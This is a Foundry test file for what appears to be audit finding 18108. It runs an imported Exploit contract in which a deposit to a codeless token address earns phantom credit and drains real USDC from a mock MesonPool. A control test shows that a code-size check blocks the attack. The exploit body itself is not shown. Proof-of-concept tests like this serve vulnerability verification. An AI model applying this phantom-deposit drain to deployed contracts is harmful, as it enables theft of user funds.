// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import "forge-std/console2.sol";
import {Exploit, MesonPool, Usdc} from "./18108-lack-of-contract-existence-check-on-transfer-transferfrom-ca.sol";

contract Finding18108Test is Test {
    function test_exploit_codeless_deposit_withdraws_real_usdc() public {
        Exploit e = new Exploit();
        e.run();

        assertEq(e.codeSize(), 0, "codeless");
        assertEq(e.credited(), 1000e6, "phantom credit");
        assertEq(e.usdcWhileCredited(), 1000e6, "usdc still in the pool after post");
        assertEq(e.withdrawn(), 1000e6, "withdrawn");
        assertEq(e.usdc().balanceOf(address(e)), 1000e6, "attacker usdc");
        assertEq(e.usdc().balanceOf(address(e.pool())), 0, "pool drained");
        assertEq(e.pool().credit(address(e)), 0, "credit cleared");

        console2.log("phantom credit");
        console2.log(e.credited());
        console2.log("pool USDC while that credit was outstanding");
        console2.log(e.usdcWhileCredited());
        console2.log("real USDC withdrawn");
        console2.log(e.withdrawn());
    }

    function test_control_code_size_blocks_the_post() public {
        Exploit e = new Exploit();
        bool posted = e.runControl();

        assertFalse(posted, "checked post succeeded");
        assertEq(e.pool().credit(address(e)), 0, "credit");
        assertEq(e.usdc().balanceOf(address(e.pool())), 1000e6, "usdc left the pool");
        assertEq(e.usdc().balanceOf(address(e)), 0, "attacker was paid");

        console2.log("control posted");
        console2.log(posted ? 1 : 0);
        console2.log("pool USDC kept");
        console2.log(e.usdc().balanceOf(address(e.pool())));
    }
}
